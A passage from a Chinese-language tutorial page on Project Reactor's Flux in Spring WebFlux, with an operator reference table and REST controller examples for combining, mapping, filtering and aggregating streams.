class="hljs-meta">@GetMapping</span>(<span class="hljs-string">&quot;/never&quot;</span>)<br>    <span class="hljs-keyword">public</span> <span class="hljs-title class_">Flux</span>&lt;<span class="hljs-title class_">String</span>&gt; <span class="hljs-title function_">never</span>(<span class="hljs-params"></span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-title class_">Flux</span>.<span class="hljs-title function_">never</span>();<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure></li></ol></li></ol><p>&#x3D;&#x3D;6.组合多个流&#x3D;&#x3D;<br>不生成新数据，而是对多个已有 Flux 进行组合或转换。</p><ol><li><code>Flux.from(Publisher&lt;? extends T&gt; source)</code><ol><li>从另一个 <code>Publisher</code>（如 <code>Mono</code> 或其他 <code>Flux</code>）创建 <code>Flux</code>。</li></ol></li><li><code>Flux.concat(Publisher&lt;? extends T&gt;... sources)</code><ol><li>按顺序连接多个 <code>Publisher</code>，依次发出它们的元素</li></ol></li><li><code>Flux.merge(Publisher&lt;? extends T&gt;... sources)</code><ol><li>合并多个 <code>Publisher</code>，异步发出元素（不保证顺序)）</li></ol></li><li><code>Flux.zip(Publisher&lt;? extends T1&gt; source1, Publisher&lt;? extends T2&gt; source2, ...)</code><ol><li>将多个 <code>Publisher</code> 的元素组合成元组。<figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-meta">@RestController</span><br><span class="hljs-meta">@RequestMapping</span>(<span class="hljs-string">&quot;/api&quot;</span>)<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ReactiveExample</span> &#123;<br><br>    <span class="hljs-comment">// 1. Flux.from(Publisher&lt;? extends T&gt; source)</span><br>    <span class="hljs-meta">@GetMapping</span>(<span class="hljs-string">&quot;/fromPublisher&quot;</span>)<br>    <span class="hljs-keyword">public</span> <span class="hljs-title class_">Flux</span>&lt;<span class="hljs-title class_">String</span>&gt; <span class="hljs-title function_">fromPublisher</span>(<span class="hljs-params"></span>) &#123;<br>        <span class="hljs-title class_">Mono</span>&lt;<span class="hljs-title class_">String</span>&gt; mono = <span class="hljs-title class_">Mono</span>.<span class="hljs-title function_">just</span>(<span class="hljs-string">&quot;Mono data&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-title class_">Flux</span>.<span class="hljs-title function_">from</span>(mono);<br>    &#125;<br><br>    <span class="hljs-comment">// 2. Flux.concat(Publisher&lt;? extends T&gt;... sources)</span><br>    <span class="hljs-meta">@GetMapping</span>(<span class="hljs-string">&quot;/concat&quot;</span>)<br>    <span class="hljs-keyword">public</span> <span class="hljs-title class_">Flux</span>&lt;<span class="hljs-title class_">String</span>&gt; <span class="hljs-title function_">concat</span>(<span class="hljs-params"></span>) &#123;<br>        <span class="hljs-title class_">Flux</span>&lt;<span class="hljs-title class_">String</span>&gt; flux1 = <span class="hljs-title class_">Flux</span>.<span class="hljs-title function_">just</span>(<span class="hljs-string">&quot;A&quot;</span>, <span class="hljs-string">&quot;B&quot;</span>);<br>        <span class="hljs-title class_">Flux</span>&lt;<span class="hljs-title class_">String</span>&gt; flux2 = <span class="hljs-title class_">Flux</span>.<span class="hljs-title function_">just</span>(<span class="hljs-string">&quot;C&quot;</span>, <span class="hljs-string">&quot;D&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-title class_">Flux</span>.<span class="hljs-title function_">concat</span>(flux1, flux2);<br>    &#125;<br><br>    <span class="hljs-comment">// 3. Flux.merge(Publisher&lt;? extends T&gt;... sources)</span><br>    <span class="hljs-meta">@GetMapping</span>(<span class="hljs-string">&quot;/merge&quot;</span>)<br>    <span class="hljs-keyword">public</span> <span class="hljs-title class_">Flux</span>&lt;<span class="hljs-title class_">String</span>&gt; <span class="hljs-title function_">merge</span>(<span class="hljs-params"></span>) &#123;<br>        <span class="hljs-title class_">Flux</span>&lt;<span class="hljs-title class_">String</span>&gt; flux1 = <span class="hljs-title class_">Flux</span>.<span class="hljs-title function_">just</span>(<span class="hljs-string">&quot;A&quot;</span>, <span class="hljs-string">&quot;B&quot;</span>);<br>        <span class="hljs-title class_">Flux</span>&lt;<span class="hljs-title class_">String</span>&gt; flux2 = <span class="hljs-title class_">Flux</span>.<span class="hljs-title function_">just</span>(<span class="hljs-string">&quot;C&quot;</span>, <span class="hljs-string">&quot;D&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-title class_">Flux</span>.<span class="hljs-title function_">merge</span>(flux1, flux2);<br>    &#125;<br><br>    <span class="hljs-comment">// 4. Flux.zip(Publisher&lt;? extends T1&gt; source1, Publisher&lt;? extends T2&gt; source2, ...)</span><br>    <span class="hljs-meta">@GetMapping</span>(<span class="hljs-string">&quot;/zip&quot;</span>)<br>    <span class="hljs-keyword">public</span> <span class="hljs-title class_">Flux</span>&lt;<span class="hljs-title class_">String</span>&gt; <span class="hljs-title function_">zip</span>(<span class="hljs-params"></span>) &#123;<br>        <span class="hljs-title class_">Flux</span>&lt;<span class="hljs-title class_">String</span>&gt; flux1 = <span class="hljs-title class_">Flux</span>.<span class="hljs-title function_">just</span>(<span class="hljs-string">&quot;A&quot;</span>, <span class="hljs-string">&quot;B&quot;</span>);<br>        <span class="hljs-title class_">Flux</span>&lt;<span class="hljs-title class_">String</span>&gt; flux2 = <span class="hljs-title class_">Flux</span>.<span class="hljs-title function_">just</span>(<span class="hljs-string">&quot;1&quot;</span>, <span class="hljs-string">&quot;2&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-title class_">Flux</span>.<span class="hljs-title function_">zip</span>(flux1, flux2, (s1, s2) -&gt; s1 + s2);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure></li></ol></li></ol><hr><h5 id="6-1-2-flux-对象实例方法"><a href="#6-1-2-flux-对象实例方法" class="headerlink" title="6.1.2. flux 对象实例方法"></a>6.1.2. flux 对象实例方法</h5><h6 id="6-1-2-1-实例方法一览表"><a href="#6-1-2-1-实例方法一览表" class="headerlink" title="6.1.2.1. 实例方法一览表"></a>6.1.2.1. 实例方法一览表</h6><table><thead><tr><th><strong>实例方法</strong></th><th><strong>功能描述</strong></th></tr></thead><tbody><tr><td><strong>转换与映射方法</strong></td><td></td></tr><tr><td><code>map(Function&lt;? super T, ? extends R&gt; mapper)</code></td><td>对流中每个元素应用提供的函数（同步简单操作），将它从类型 T 变换成类型 R。<br>与 <code>flatMap</code> 不同点在于：<code>map</code> 是同步操作，结果通常是原始类型转换，没有异步流。</td></tr><tr><td><code>flatMap(Function&lt;? super T, ? extends Publisher&lt;? extends R&gt;&gt; mapper)</code></td><td>对每个元素执行一个异步操作（异步阻塞、异步非阻塞），返回一个新的异步流，并将所有这些异步流与元素合并成一个流。<br>“展平”的意思是把多个 Publisher 的流合成一个统一的 Flux。</td></tr><tr><td><code>cast(Class&lt;R&gt; clazz)</code></td><td>将流中元素强制转换为类型 R；若元素类型与 R 无继承或实现关系（即类型不兼容），将抛出 <code>ClassCastException</code> 异常。</td></tr><tr><td><code>ofType(Class&lt;U&gt; clazz)</code></td><td>仅保留属于指定类型 U 的元素，过滤掉其他类型的元素。</td></tr><tr><td><code>switchIfEmpty(Publisher&lt;? extends T&gt; alternate)</code></td><td>如果 Flux 为空（没有发出任何元素就完成），则切换到指定的备用 Publisher（如另一个 Flux 或 Mono）继续发出元素。<br>注意：是整个 Flux 为空，而不是某个元素为空</td></tr><tr><td><code>defaultIfEmpty(T defaultValue)</code></td><td>如果 Flux 为空（没有发出任何元素就完成），则发出指定的默认值（可以是流，也可以不是流）并完成。<br>与 <code>switchIfEmpty</code> 不同点在于：<code>defaultIfEmpty</code> 提供的是一个固定的同步值，而不是另一个异步流。适用于简单场景，如为空时返回默认字符串或对象。</td></tr><tr><td><strong>过滤方法</strong></td><td></td></tr><tr><td><code>filter(Predicate&lt;? super T&gt; predicate)</code></td><td>对每个元素执行断言函数，仅保留返回 <code>true</code> 的元素，返回 <code>false</code> 的元素将被过滤掉（满足条件的保留）。</td></tr><tr><td><code>distinct()</code></td><td>去重操作，移除重复元素，确保每个元素在流中只出现一次（对整个流去重，不论是否分批加载）。<br>核心机制：维护一个 <code>HashSet</code> 来记录已发出的元素。每当一个新元素准备推送时，都会先检查是否已存在于集合中。若处理的数据流非常大（如百万级），这个集合可能迅速膨胀，占用大量内存。</td></tr><tr><td><strong>收集与聚合方法</strong></td><td></td></tr><tr><td><code>collectList()</code></td><td>等到整个流执行完毕（无论是否分批加载），所有元素会被收集进一个 <code>List</code>，并最终通过 <code>Mono&lt;List&gt;</code> 一次性发送。例如：<code>Flux.just(&quot;A&quot;, &quot;B&quot;, &quot;C&quot;).collectList();</code> 会返回 <code>[&quot;A&quot;, &quot;B&quot;, &quot;C&quot;]</code>。</td></tr><tr><td><code>collectMultimap(Function&lt;? super T, ? extends K&gt; keyMapper)</code></td><td>使用 keyMapper 为每个元素生成键，将元素本身作为值，汇聚到一个 <code>Map&lt;K, Collection&lt;T&gt;&gt;</code> 里，并封装成 <code>Mono&lt;Map&lt;K, Collection&lt;T&gt;&gt;&gt;</code> 返回，就像按标签分门别类地整理档案。</td></tr><tr><td><code>reduce(BiFunction&lt;T, T, T&gt; aggregator)</code></td><td>对流中元素进行两两累积，将前一次计算结果与下一个元素交给 aggregator 处理，最终合成一个值并通过 Mono 发出。常用于求和、拼接字符串、数据汇总等。</td></tr><tr><td><code>scan(BiFunction&lt;T, T, T&gt; accumulator)</code></td><td>类似 reduce，但每遇到一个新元素就会「打卡」一次，立刻把当前的累积结果发出来——就好比你在跑步时，每跑一公里就看一次手表，实时掌握进度。</td></tr><tr><td><strong>合并与组合方法</strong></td><td></td></tr><tr><td><code>mergeWith(Publisher&lt;? extends T&gt; other)</code></td><td>并行地把另一个流的元素插入当前流，不保证顺序——就像把两条河的水汇入同一个大江，水流混杂而不分先后。</td></tr><tr><td><code>concatWith(Publisher&lt;? extends T&gt; other)</code></td><td>先发完当前流所有元素，再按顺序接入另一个流，保证完全的先后顺序，就像礼貌地排队，前面的人走完后才轮到后面。</td></tr><tr><td><code>zipWith(Publisher&lt;? extends U&gt; other)</code></td><td>两个流按索引位置逐个配对生成 <code>Tuple2&lt;T, U&gt;</code>，如 flux1 的第一个元素配 flux2 的第一个元素；当任一流提前结束，组合流也会结束。适用于必须一一对应的场景。</td></tr><tr><td><code>combineLatest(Publisher&lt;? extends U&gt; other, BiFunction&lt;T, U, R&gt; combinator)</code></td><td>订阅两个流，并在任一流发出新元素时，取对方最新值一起合并发出。</td></tr><tr><td><strong>限制与截取方法</strong></td><td></td></tr><tr><td><code>take(long n)</code></td><td>只接收前 n 个元素，下游收到 n 个后就主动完成，适合取样或分页场景。</td></tr><tr><td><code>takeLast(int n)</code></td><td>缓存发出的所有元素，等整个流执行完毕才一次性发出最后 n 个元素；常用于需要尾部数据的情况，但要注意内存开销。</td></tr><tr><td><code>skip(long n)</code></td><td>忽略前 n 个元素，直接跳过，再把剩余元素发给下游。</td></tr><tr><td><code>skipLast(int n)</code></td><td>缓存发出的所有元素，等整个流执行完毕后丢弃最后 n 个元素，再把剩下的一起发出。</td></tr><tr><td><strong>错误处理方法</strong></td><td></td></tr><tr><td><code>onErrorReturn(T fallback)</code></td><td>一旦上游发生错误，就发出一个默认值（可以是流也可以不是流），不再传递错误信号。</td></tr><tr><td><code>onErrorMap(Function&lt;Throwable, ? extends Throwable&gt; mapper)</code></td><td>捕获异常并将其包装或转换为另一种更具语义的异常类型，然后重新发出错误信号，便于统一上层错误处理策略。简单来说：异常 A -&gt; 异常 X，上层统一处理异常 X。</td></tr><tr><td><code>onErrorResume(Function&lt;Throwable, ? extends Publisher&lt;? extends T&gt;&gt; fallback)</code></td><td>错误发生时，切换到备用的 Publisher 继续发出元素，避免整个流被中断，可用于降级、重试或备用数据源。</td></tr><tr><td><code>onErrorContinue(BiConsumer&lt;Throwable, Object&gt; errorConsumer)</code></td><td>对单个元素处理出错时只执行指定副作用（如记录日志），并跳过该元素继续后续处理，下游不会收到错误；相当于「有容错的流水线」。</td></tr><tr><td><code>retry(long times)</code></td><td>出错时将重试整个 Flux 上游 <code>times</code> 次（总共尝试 1 + times 次）。</td></tr><tr><td><strong>延迟与调度方法</strong></td><td></td></tr><tr><td><code>delayElements(Duration delay)</code></td><td>给每个元素之间插入固定延迟，模拟节流或人为降速，就像每隔一秒钟才放一个包裹。</td></tr><tr><td><code>subscribeOn(Scheduler scheduler)</code></td><td>指定整个订阅过程在哪个调度器线程上运行（影响源的执行线程）<br>注意：多个 <code>subscribeOn</code> 只会生效第一个</td></tr><tr><td><code>publishOn(Scheduler scheduler)</code></td><td>指定 <code>publishOn</code> 之后的操作在那个线程池执行</td></tr><tr><td><code>timeout(Duration timeout)</code></td><td>设置超时时间，如果某个元素未在规定时间内到达，就抛出 <code>TimeoutException</code>，用于超时控制</td></tr><tr><td><strong>其他实用方法</strong></td><td></td></tr><tr><td><code>doOnNext(Consumer&lt;? super T&gt; onNext)</code></td><td>每当流发出一个元素时执行指定副作用（如日志、指标统计），但不改变元素本身；就像在传送带上做一次检查打标。</td></tr><tr><td><code>doOnError(Consumer&lt;? super Throwable&gt; onError)</code></td><td>流遇到错误时执行副作用（如记录日志、告警），然后再把错误继续抛给下游；适合在错误点插入埋点或监控。</td></tr><tr><td><code>doOnComplete(Runnable onComplete)</code></td><td>在流正常走完所有元素后执行一次副作用，如资源释放或完成通知；就像闭环操作中的收尾仪式。</td></tr><tr><td><code>doOnSubscribe(Consumer&lt;? super Subscription&gt; onSubscribe)</code></td><td>订阅者发起订阅时触发，用于记录或处理初次订阅行为，比如打日志或初始化状态。</td></tr><tr><td><code>doFinally(Consumer&lt;SignalType&gt; onFinally)</code></td><td>在流终止时（无论正常完成、取消、还是出错）都执行指定副作用，相当于 finally 块，常用于收尾清理等场景。</td></tr><tr><td><code>log()</code></td><td>自动在控制台打印 Flux 的信号轨迹，包括订阅、请求、发出元素、完成和错误，帮你像放监控摄像头一样随时看流水线状态。</td></tr><tr><td><code>cache()</code></td><td>将流转换为可重放的热流，缓存所有元素，后续订阅者会立刻看到之前的数据，无需再次执行上游逻辑；适合昂贵操作的结果复用。</td></tr><tr><td><code>share()</code></td><td>也会把 Cold Flux 变成 Hot Flux，但不缓存旧数据，所有订阅者共享同一份数据流，适合广播式分发；就像把演唱会直播送给多个观众同时观看。</td></tr><tr><td><strong>订阅方法</strong></td><td></td></tr><tr><td><code>subscribe()</code></td><td>触发流的执行，<strong>不处理任何信号</strong>（元素、错误、完成），</td></tr><tr><td><code>subscribe(Consumer&lt;? super T&gt; onNext)</code></td><td>触发流的执行，只处理正常发出的元素，不管错误或完成</td></tr><tr><td><code>subscribe(Consumer&lt;? super T&gt; onNext, Consumer&lt;? super Throwable&gt; onError, Runnable onComplete)</code></td><td>触发流的执行，分别处理元素、错误、完成 三种信号</td></tr></tbody></table><hr><h6 id="6-1-2-2-转换与映射方法"><a href="#6-1-2-2-转换与映射方法" class="headerlink" title="6.1.2.2. 转换与映射方法"></a>6.1.2.2. 转换与映射方法</h6><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-meta">@RestController</span><br><span class="hljs-meta">@RequestMapping</span>(<span class="hljs-string">&quot;/api/operators&quot;</span>)<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">OperatorExamples</span> &#123;<br><br>    <span class="hljs-comment">// 1. map(Function&lt;? super T, ? extends R&gt; mapper)</span><br>    <span class="hljs-meta">@GetMapping</span>(<span class="hljs-string">&quot;/map&quot;</span>)<br>    <span class="hljs-keyword">public</span> <span class="hljs-title class_">Flux</span>&lt;<span class="hljs-title class_">Integer</span>&gt; <span class="hljs-title function_">mapExample</span>(<span class="hljs-params"></span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-title class_">Flux</span>.<span class="hljs-title function_">just</span>(<span class="hljs-string">&quot;1&quot;</span>, <span class="hljs-string">&quot;2&quot;</span>, <span class="hljs-string">&quot;3&quot;</span>)<br>                   .<span class="hljs-title function_">map</span>(<span class="hljs-title class_">Integer</span>::<span class="hljs-built_in">parseInt</span>); <span class="hljs-comment">// 将 String 类型转换成 Integer 类型</span><br>    &#125;<br><br>    <span class="hljs-comment">// 2. flatMap(Function&lt;? super T, ? extends Publisher&lt;? extends R&gt;&gt; mapper)</span><br>    <span class="hljs-meta">@GetMapping</span>(<span class="hljs-string">&quot;/flatMap&quot;</span>)<br>    <span class="hljs-keyword">public</span> <span class="hljs-title class_">Flux</span>&lt;<span class="hljs-title class_">String</span>&gt; <span class="hljs-title function_">flatMapExample</span>(<span class="hljs-params"></span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-title class_">Flux</span>.<span class="hljs-title function_">just</span>(<span class="hljs-string">&quot;user1&quot;</span>, <span class="hljs-string">&quot;user2&quot;</span>)<br>                   .<span class="hljs-title function_">flatMap</span>(userId -&gt; <span class="hljs-title class_">Mono</span>.<span class="hljs-title function_">just</span>(<span class="hljs-string">&quot;Profile of &quot;</span> + userId)); <span class="hljs-comment">// 模拟异步调用</span><br>    &#125;<br><br>    <span class="hljs-comment">// 3. cast(Class&lt;R&gt; clazz)</span><br>    <span class="hljs-meta">@GetMapping</span>(<span class="hljs-string">&quot;/cast&quot;</span>)<br>    <span class="hljs-keyword">public</span> <span class="hljs-title class_">Flux</span>&lt;<span class="hljs-title class_">Number</span>&gt; <span class="hljs-title function_">castExample</span>(<span class="hljs-params"></span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-title class_">Flux</span>.<span class="hljs-title function_">just</span>(<span class="hljs-number">1</span>, <span class="hljs-number">2.0</span>, 3L)<br>                   .<span class="hljs-title function_">cast</span>(<span class="hljs-title class_">Number</span>.<span class="hljs-property">class</span>); <span class="hljs-comment">// 所有元素都可以被安全地转为 Number 类型</span><br>    &#125;<br><br>    <span class="hljs-comment">// 4. ofType(Class&lt;U&gt; clazz)</span><br>    <span class="hljs-meta">@GetMapping</span>(<span class="hljs-string">&quot;/ofType&quot;</span>)<br>    <span class="hljs-keyword">public</span> <span class="hljs-title class_">Flux</span>&lt;<span class="hljs-title class_">Integer</span>&gt; <span class="hljs-title function_">ofTypeExample</span>(<span class="hljs-params"></span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-title class_">Flux</span>.<span class="hljs-title function_">just</span>(<span class="hljs-number">1</span>, <span class="hljs-string">&quot;two&quot;</span>, <span class="hljs-number">3</span>, <span class="hljs-string">&quot;four&quot;</span>)<br>                   .<span class="hljs-title function_">ofType</span>(<span class="hljs-title class_">Integer</span>.<span class="hljs-property">class</span>); <span class="hljs-comment">// 只保留 Integer 类型的元素</span><br>    &#125;<br>    <br><span class="hljs-comment">// 5. switchIfEmpty(Publisher&lt;? extends T&gt; alternate)</span><br>    <span class="hljs-meta">@GetMapping</span>(<span class="hljs-string">&quot;/switchIfEmpty&quot;</span>)<br>    <span class="hljs-keyword">public</span> <span class="hljs-title class_">Flux</span>&lt;<span class="hljs-title class_">String</span>&gt; <span class="hljs-title function_">switchIfEmptyExample</span>(<span class="hljs-params"></span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-title class_">Flux</span>.&lt;<span class="hljs-title class_">String</span>&gt;<span class="hljs-title function_">empty</span>()<br>                   .<span class="hljs-title function_">switchIfEmpty</span>(<span class="hljs-title class_">Flux</span>.<span class="hljs-title function_">just</span>(<span class="hljs-string">&quot;default1&quot;</span>, <span class="hljs-string">&quot;default2&quot;</span>));<br>    &#125;<br><br>    <span class="hljs-comment">// 6. defaultIfEmpty(T defaultValue)</span><br>    <span class="hljs-meta">@GetMapping</span>(<span class="hljs-string">&quot;/defaultIfEmpty&quot;</span>)<br>    <span class="hljs-keyword">public</span> <span class="hljs-title class_">Flux</span>&lt;<span class="hljs-title class_">String</span>&gt; <span class="hljs-title function_">defaultIfEmptyExample</span>(<span class="hljs-params"></span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-title class_">Flux</span>.&lt;<span class="hljs-title class_">String</span>&gt;<span class="hljs-title function_">empty</span>()<br>                   .<span class="hljs-title function_">defaultIfEmpty</span>(<span class="hljs-string">&quot;default-value&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><hr><h6 id="6-1-2-3-过滤方法"><a href="#6-1-2-3-过滤方法" class="headerlink" title="6.1.2.3. 过滤方法"></a>6.1.2.3. 过滤方法</h6><figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs kotlin"><span class="hljs-meta">@RestController</span><br><span class="hljs-meta">@RequestMapping(<span class="hljs-string">&quot;/api/operators&quot;</span>)</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">OperatorExamples</span> &#123;<br><br>    <span class="hljs-comment">// 1. filter(Predicate&lt;? super T&gt; predicate)</span><br>    <span class="hljs-meta">@GetMapping(<span class="hljs-string">&quot;/filter&quot;</span>)</span><br>    <span class="hljs-keyword">public</span> Flux&lt;String&gt; filterExample() &#123;<br>        <span class="hljs-keyword">return</span> Flux.just(<span class="hljs-string">&quot;apple&quot;</span>, <span class="hljs-string">&quot;banana&quot;</span>, <span class="hljs-string">&quot;cherry&quot;</span>, <span class="hljs-string">&quot;date&quot;</span>)<br>                   .filter(fruit -&gt; fruit.startsWith(<span class="hljs-string">&quot;a&quot;</span>)); <span class="hljs-comment">// 只保留以 &quot;a&quot; 开头的元素</span><br>    &#125;<br><br>    <span class="hljs-comment">// 2. distinct()</span><br>    <span class="hljs-meta">@GetMapping(<span class="hljs-string">&quot;/distinct&quot;</span>)</span><br>    <span class="hljs-keyword">public</span> Flux&lt;String&gt; distinctExample() &#123;<br>        <span class="hljs-keyword">return</span> Flux.just(<span class="hljs-string">&quot;apple&quot;</span>, <span class="hljs-string">&quot;banana&quot;</span>, <span class="hljs-string">&quot;apple&quot;</span>, <span class="hljs-string">&quot;cherry&quot;</span>, <span class="hljs-string">&quot;banana&quot;</span>)<br>                   .distinct(); <span class="hljs-comment">// 去除重复元素，确保每个元素只出现一次</span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><hr><h6 id="6-1-2-4-收集与聚合方法"><a href="#6-1-2-4-收集与聚合方法" class="headerlink" title="6.1.2.4. 收集与聚合方法"></a>6.1.2.4. 收集与聚合方法</h6><figure class="highlight coffeescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs coffeescript">@RestController<br>@RequestMapping(<span class="hljs-string">&quot;/api/operators&quot;</span>)<br>public <span class="hljs-keyword">class</span> <span class="hljs-title class_">OperatorExamples</span> &#123;<br><br>    <span class="hljs-regexp">//</span> <span class="hljs-number">1.</span> collectList()<br>    @GetMapping(<span class="hljs-string">&quot;/collectList&quot;</span>)<br>    public Mono&lt;List&lt;<span class="hljs-built_in">String</span>&gt;&gt; collectListExample() &#123;<br>        <span class="hljs-keyword">return</span> Flux.just(<span class="hljs-string">&quot;A&quot;</span>, <span class="hljs-string">&quot;B&quot;</span>, <span class="hljs-string">&quot;C&quot;</span>)<br>                   .collectList(); <span class="hljs-regexp">//</span> 返回：[<span class="hljs-string">&quot;A&quot;</span>,<span class="hljs-string">&quot;B&quot;</span>,<span class="hljs-string">&quot;C&quot;</span>]<br>    &#125;<br><br>    <span class="hljs-regexp">//</span> <span class="hljs-number">2.</span> collectMultiMap(<span class="hljs-built_in">Function</span>&lt;? super T, ? <span class="hljs-keyword">extends</span> K&gt; keyMapper)<br>@GetMapping(<span class="hljs-string">&quot;/collectMap&quot;</span>)  <br>public Mono&lt;<span class="hljs-built_in">Map</span>&lt;Character, Collection&lt;<span class="hljs-built_in">String</span>&gt;&gt;&gt; collectMapExample() &#123;  <br>    <span class="hljs-keyword">return</span> Flux.just(<span class="hljs-string">&quot;apple&quot;</span>, <span class="hljs-string">&quot;banana&quot;</span>, <span class="hljs-string">&quot;apricot&quot;</span>)  <br>            .collectMultimap(word -&gt; word.charAt(<span class="hljs-number">0</span>)); <span class="hljs-regexp">//</span> 用每个单词的首字母作为 key，返回：&#123;<span class="hljs-string">&quot;a&quot;</span>:[<span class="hljs-string">&quot;apple&quot;</span>,<span class="hljs-string">&quot;apricot&quot;</span>],<span class="hljs-string">&quot;b&quot;</span>:[<span class="hljs-string">&quot;banana&quot;</span>]&#125;<br>&#125;<br><br>    <span class="hljs-regexp">//</span> <span class="hljs-number">3.</span> reduce(BiFunction&lt;T, T, T&gt; aggregator)<br>    @GetMapping(<span class="hljs-string">&quot;/reduce&quot;</span>)<br>    public Mono&lt;<span class="hljs-built_in">String</span>&gt; reduceExample() &#123;<br>        <span class="hljs-keyword">return</span> Flux.just(<span class="hljs-string">&quot;A&quot;</span>, <span class="hljs-string">&quot;B&quot;</span>, <span class="hljs-string">&quot;C&quot;</span>)<br>                   .reduce(<span class="hljs-function"><span class="hljs-params">(a, b)</span> -&gt;</span> a + b); <span class="hljs-regexp">//</span> 累加成一个字符串，返回：<span class="hljs-string">&quot;ABC&quot;</span><br>    &#125;<br><br>    <span class="hljs-regexp">//</span> <span class="hljs-number">4.</span> scan(BiFunction&lt;T, T, T&gt; accumulator)<br>    @GetMapping(<span class="hljs-string">&quot;/scan&quot;</span>)<br>    public Flux&lt;<span class="hljs-built_in">String</span>&gt; scanExample() &#123;<br>        <span class="hljs-keyword">return</span> Flux.just(<span class="hljs-string">&quot;A&quot;</span>, <span class="hljs-string">&quot;B&quot;</span>, <span class="hljs-string">&quot;C&quot;</span>)<br>                   .scan(<span class="hljs-function"><span class="hljs-params">(a, b)</span> -&gt;</span> a + b); <span class="hljs-regexp">//</span> 实时输出，返回：<span class="hljs-string">&quot;A&quot;</span>, <span class="hljs-string">&quot;AB&quot;</span>, <span class="hljs-string">&quot;ABC&quot;</span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><hr><h6 id="6-1-2-5-合并与组合方法"><a href="#6-1-2-5-合并与组合方法" class="headerlink" title="6.1.2.5. 合并与组合方法"></a>6.1.2.5. 合并与组合方法</h6><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span 